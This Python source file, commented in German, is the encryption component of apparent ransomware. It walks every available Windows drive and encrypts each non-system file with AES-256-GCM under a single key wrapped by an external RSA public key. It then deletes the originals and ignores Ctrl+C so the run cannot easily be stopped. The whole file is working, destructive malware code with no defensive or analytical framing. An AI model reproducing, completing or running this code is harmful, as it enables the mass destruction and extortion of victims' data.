
import os
import logging
import time
from pathlib import Path
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from tqdm import tqdm
from logging.handlers import RotatingFileHandler
import base64
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
from config import Config

LOG_FILE = Config.LOG_FILE
RSA_PUBLIC_KEY_PATH = Config.RSA_PUBLIC_KEY_PATH
ENCRYPTED_KEY_FILENAME = Config.ENCRYPTED_KEY_FILENAME
ENCRYPTED_EXTENSION = Config.ENCRYPTED_EXTENSION
EXCLUDED_DIRS = Config.EXCLUDED_DIRS
CHUNK_SIZE = Config.CHUNK_SIZE

# === Imports für Kryptografie, Logging, Parallelisierung, etc. ===
# cryptography: Für AES/RSA-Verschlüsselung
# tqdm: Fortschrittsbalken für große Dateimengen
# RotatingFileHandler: Log-Rotation
# base64/json/hashlib: Hilfsfunktionen für Metadaten und Integritätsprüfung
# concurrent.futures: ThreadPoolExecutor für parallele Verarbeitung

# Logging konfigurieren
handler = RotatingFileHandler(LOG_FILE, maxBytes=10_000_000, backupCount=3)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        handler,
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Ctrl+C ignorieren
signal.signal(signal.SIGINT, signal.SIG_IGN)

def encrypt_files():
    """Durchsucht das Dateisystem, verschlüsselt Dateien und speichert den verschlüsselten Schlüssel."""
    try:
        start_time = time.time()
        logger.info("Starte Verschlüsselungsprozess")
        
        # Prüfe, ob der öffentliche Schlüssel existiert
        if not RSA_PUBLIC_KEY_PATH.exists():
            logger.error(f"Öffentlicher Schlüssel nicht gefunden: {RSA_PUBLIC_KEY_PATH}")
            return False
            
        # Lade den RSA-Schlüssel
        try:
            rsa_key = load_rsa_public_key()
            logger.info("RSA-Schlüssel erfolgreich geladen")
        except Exception as e:
            logger.error(f"Fehler beim Laden des RSA-Schlüssels: {e}")
            return False
        
        # Universellen Fernet-Key für alle Dateien generieren
        universal_fernet_key = os.urandom(32)  # 32 Bytes für AES-256
        # Verschlüsselten Fernet-Key mit RSA verschlüsseln
        encrypted_key = encrypt_fernet_key(universal_fernet_key, rsa_key)
        # Schlüsseldatei im Hauptverzeichnis speichern
        key_file_path = Path(ENCRYPTED_KEY_FILENAME)
        with open(key_file_path, 'wb') as kf:
            kf.write(encrypted_key)
        logger.info(f"Universeller Schlüssel gespeichert: {key_file_path}")
        
        # Liste der zu verschlüsselnden Dateien sammeln
        try:
            files_to_encrypt = collect_files_to_encrypt()
            logger.info(f"Gefunden: {len(files_to_encrypt)} zu verschlüsselnde Dateien")
        except Exception as e:
            logger.error(f"Fehler beim Sammeln der zu verschlüsselnden Dateien: {e}")
            return False
            
        # Verschlüsseln aller Dateien in Chunks
        successful_encryptions = 0
        failed_encryptions = 0
        
        # Parallelisierung: ThreadPoolExecutor für schnellere Verarbeitung
        with ThreadPoolExecutor(max_workers=os.cpu_count() or 4) as executor:
            # Jede Datei wird als separater Task an den ThreadPool übergeben
            future_to_file = {
                executor.submit(encrypt_file_in_chunks, file_path, universal_fernet_key): file_path
                for file_path in files_to_encrypt
            }
            # Fortschrittsbalken für die Verschlüsselung
            for future in tqdm(as_completed(future_to_file), total=len(files_to_encrypt), desc="Verschlüsselung der Dateien", unit="Datei"):
                file_path = future_to_file[future]
                try:
                    result = future.result()
                    if result:
                        successful_encryptions += 1
                    else:
                        failed_encryptions += 1
                except Exception as e:
                    logger.error(f"Unerwarteter Fehler bei {file_path}: {e}")
                    failed_encryptions += 1
                
        end_time = time.time()
        duration = end_time - start_time
        
        logger.info(f"Verschlüsselungsprozess abgeschlossen. Dauer: {duration:.2f} Sekunden")
        logger.info(f"Erfolgreiche Verschlüsselungen: {successful_encryptions}")
        logger.info(f"Fehlgeschlagene Verschlüsselungen: {failed_encryptions}")
        
        return True
        
    except KeyboardInterrupt:
        logger.warning("Verschlüsselungsprozess durch Benutzer unterbrochen")
        return False
    except Exception as e:
        logger.critical(f"Kritischer Fehler im Verschlüsselungsprozess: {e}")
        return False

def load_rsa_public_key():
    """Lädt den öffentlichen RSA-Schlüssel aus public.pem."""
    try:
        # Öffne die Datei mit dem öffentlichen Schlüssel und lade ihn
        with open(RSA_PUBLIC_KEY_PATH, "rb") as f:
            return serialization.load_pem_public_key(f.read(), backend=default_backend())
    except FileNotFoundError:
        raise FileNotFoundError(f"RSA Public Key nicht gefunden: {RSA_PUBLIC_KEY_PATH}")
    except Exception as e:
        raise Exception(f"Fehler beim Laden des RSA-Schlüssels: {e}")

def encrypt_fernet_key(fernet_key: bytes, rsa_public_key) -> bytes:
    """Verschlüsselt den Fernet-Schlüssel mit RSA-OAEP."""
    try:
        # Verschlüsselt den Fernet-Key mit dem öffentlichen RSA-Schlüssel und OAEP Padding
        return rsa_public_key.encrypt(
            fernet_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        logger.error(f"Fehler bei der RSA-Verschlüsselung des Schlüssels: {e}")
        raise

def generate_iv() -> bytes:
    """Generiert einen zufälligen IV für AES-256-GCM (12 Bytes Standard für GCM)."""
    # IV (Initialisierungsvektor) ist für GCM 12 Bytes lang
    return os.urandom(12)

def is_excluded(path: Path) -> bool:
    """Überprüft, ob ein Pfad ausgeschlossen ist."""
    # Prüfe auf Ausschluss durch Verzeichnispfad
    for excluded in EXCLUDED_DIRS:
        if path == excluded or excluded in path.parents:
            return True

    # Prüfe auf bereits verschlüsselte Dateien
    if path.suffix == ENCRYPTED_EXTENSION or any(p.suffix == ENCRYPTED_EXTENSION for p in path.parents):
        return True

    # Prüfe auf Schlüsseldateien
    if path.name == ENCRYPTED_KEY_FILENAME:
        return True

    # Prüfe auf Lock-Dateien (.processing)
    if path.suffix == '.processing':
        return True

    # Prüfe auf bestimmte Dateiendungen, die nicht verschlüsselt werden sollten
    if path.suffix.lower() in ['.exe', '.dll', '.sys', '.tmp', ENCRYPTED_EXTENSION]:
        return True

    return False

def collect_files_to_encrypt():
    """Sammelt alle Dateien, die verschlüsselt werden sollen."""
    files_to_encrypt = []
    
    try:
        for drive_letter in get_available_drives():
            logger.info(f"Durchsuche Laufwerk: {drive_letter}")
            root_path = f"{drive_letter}\\"
            
            try:
                for root, dirs, files in os.walk(root_path):
                    current_dir = Path(root)
                    
                    # Filtere unerlaubte Verzeichnisse
                    dirs[:] = [
                        d for d in dirs
                        if not is_excluded(current_dir / d)
                    ]
                    
                    for filename in files:
                        file_path = current_dir / filename
                        if is_excluded(file_path):
                            continue
                        if file_path.is_file():
                            files_to_encrypt.append(file_path)
            except PermissionError:
                logger.warning(f"Keine Berechtigung für Verzeichnis: {root_path}")
            except Exception as e:
                logger.error(f"Fehler beim Durchsuchen von {root_path}: {e}")
                
    except Exception as e:
        logger.error(f"Fehler bei der Dateisammlung: {e}")
        raise
        
    return files_to_encrypt

def get_available_drives():
    """Ermittelt alle verfügbaren Laufwerke unter Windows."""
    if os.name == 'nt':  # Nur unter Windows
        # Prüft alle Buchstaben von A bis Z, ob sie als Laufwerk existieren
        return [f"{chr(d)}:" for d in range(65, 91) if os.path.exists(f"{chr(d)}:")]
    else:
        return ["C:"]  # Fallback für nicht-Windows-Systeme

def encrypt_file_in_chunks(file_path: Path, fernet_key: bytes) -> bool:
    """Verschlüsselt die Datei mit AES-256-GCM und verwendet den universellen Fernet-Key. Schreibt direkt in die Zieldatei."""
    # Lockdatei: .processing wird an die Originalendung angehängt, z.B. file.txt.processing
    processing_file = file_path.with_suffix(file_path.suffix + '.processing')
    try:
        processing_file.touch(exist_ok=True)
        iv = generate_iv()
        cipher = Cipher(algorithms.AES(fernet_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        file_hash = hashlib.sha256()
        new_file_path = file_path.with_suffix(file_path.suffix + ENCRYPTED_EXTENSION)
        try:
            # Öffne die Quelldatei zum Lesen und die Zieldatei zum Schreiben
            with open(file_path, 'rb') as in_file, open(new_file_path, 'wb') as out_file:
                out_file.write(iv)  # Schreibe IV an den Anfang der Datei
                while True:
                    chunk = in_file.read(CHUNK_SIZE)
                    if not chunk:
                        break
                    file_hash.update(chunk)  # Aktualisiere Hash für Integritätsprüfung
                    encrypted_chunk = encryptor.update(chunk)  # Verschlüssele Chunk
                    out_file.write(encrypted_chunk)  # Schreibe verschlüsselten Chunk
                # finalize() wirft bei GCM normalerweise keinen Fehler, Tag ist über encryptor.tag verfügbar
                encryptor.finalize()
                out_file.write(encryptor.tag)  # Schreibe Auth-Tag ans Ende
                out_file.write(file_hash.digest())  # Schreibe SHA256-Hash der Originaldatei
        except Exception as e:
            logger.error(f"Fehler beim Lesen/Verschlüsseln/Schreiben von {file_path}: {e}")
            return False
        # Lösche die Originaldatei nach erfolgreicher Verschlüsselung
        try:
            file_path.unlink()
            logger.info(f"[+] Verschlüsselt: {file_path}")
        except PermissionError:
            logger.warning(f"Keine Berechtigung zum Löschen von: {file_path}")
            return False
        except Exception as e:
            logger.error(f"Fehler beim Löschen der Originaldatei {file_path}: {e}")
            return False
        return True
    except Exception as e:
        logger.error(f"Fehler bei der Verschlüsselung von {file_path}: {e}")
        return False
    finally:
        # Entferne die Lockdatei, falls sie existiert
        if processing_file.exists():
            processing_file.unlink()

if __name__ == "__main__":
    # Starte den Verschlüsselungsprozess, wenn das Skript direkt ausgeführt wird
    encrypt_files()